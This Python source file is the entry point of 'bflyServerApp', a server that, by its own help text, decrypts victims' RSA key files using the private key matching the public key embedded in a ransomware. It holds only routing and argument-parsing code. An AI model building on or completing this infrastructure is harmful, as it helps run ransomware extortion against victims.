import logging
import argparse

from bflyServerApp import Router
from bflyServerApp.apihandler import APIHandler
from bflyServerApp.utils import Logger
from bflyServerApp import __version__, __title__


class BFLYServerApp:
    """ class BFLYServerApp to set up all instances needed for this application

    USAGE:
            bflyServerApp = BFLYServerApp(sprivatersa_filepath=../../masterkeys/SPrivateRSA.pem)
            bflyServerApp.run(host=args.host, port=args.port)
    """
    def __init__(self, sprivatersa_filepath):
        self.logger = logging.getLogger(__title__)
        self.logger.info('Create class BFLYServerApp')
        self.version = 'v1'
        self.api_endpoint_str = '/api/' + self.version
        self.sprivatersa_filepath = sprivatersa_filepath

        # create the APIHandler instance
        self.api = APIHandler(sprivatersa_filepath=sprivatersa_filepath)

        # router instance for specific endpoints
        self.router = Router(name=__title__)
        self.router.add_endpoint('/', 'index', method="GET", handler=self.api.index)
        self.router.add_endpoint(endpoint=self.api_endpoint_str + '/decryption/', endpoint_name='decryption', method="POST", handler=self.api.route_decrypt, strict_slashes=False)
        self.router.add_endpoint(endpoint=self.api_endpoint_str + '/decryption/counter', endpoint_name='decryption_counter', method="GET", handler=self.api.route_decryption_counter, strict_slashes=False)
        self.router.add_endpoint(endpoint=self.api_endpoint_str + '/version/', endpoint_name='version', method="GET", handler=self.api.route_version, strict_slashes=False)

    def run(self, host='0.0.0.0', port=None, debug=None):
        """ runs the BFLYServerApp application on given port

        :param host: default hostname
        :param port: port for the webserver
        :param debug: debug mode true or false
        """
        self.router.run(host=host, port=port, debug=debug)


def main():

    usage1 = "bflyServerApp --key ../../masterkeys/SPrivateRSA.pem"
    usage2 = "bflyServerApp --host 127.0.0.1 --port 8080 --key ../../masterkeys/SPrivateRSA.pem"
    usage3 = "bflyServerApp --help"

    description = "Butterfly Server Application for a secure remote Decryption of the Client's CPrivateRSA.bin File\n\nUsage:\n      {}\n      {}\n      {}".format(usage1, usage2, usage3)

    # parse arguments
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    # argument for the host address
    parser.add_argument('--host', type=str, help='Hostname for the Application. Default: 127.0.0.1', default='127.0.0.1')
    # argument for the port
    parser.add_argument('-p', '--port', type=int, help='Port for the Application. Default: 5000', default=5000)
    # argument for the SPrivateRSA.pem file
    parser.add_argument('-k', '--key', type=str, help='Private Key from the Server for the Decryption (Corresponds to the embedded Server Public Key in the Ransomware)', required=True)
    # argument for the current version
    parser.add_argument('-l', '--log', type=str, help='Logging folder for the Application. Default: /var/log/bflyServerApp', default='/var/log/bflyServerApp')
    # argument for the current version
    parser.add_argument('-v', '--version', action='version', version=__version__, help='Shows the current version')

    # parse all arguments
    args = parser.parse_args()

    # set up logger instance
    logger = Logger(name=__title__, level='info', log_folder=args.log)
    logger.info("Start Application bflyServerApp with version {}".format(__version__))

    # create application instance
    bflyServerApp = BFLYServerApp(sprivatersa_filepath=args.key)
    bflyServerApp.run(host=args.host, port=args.port)


if __name__ == '__main__':
    main()
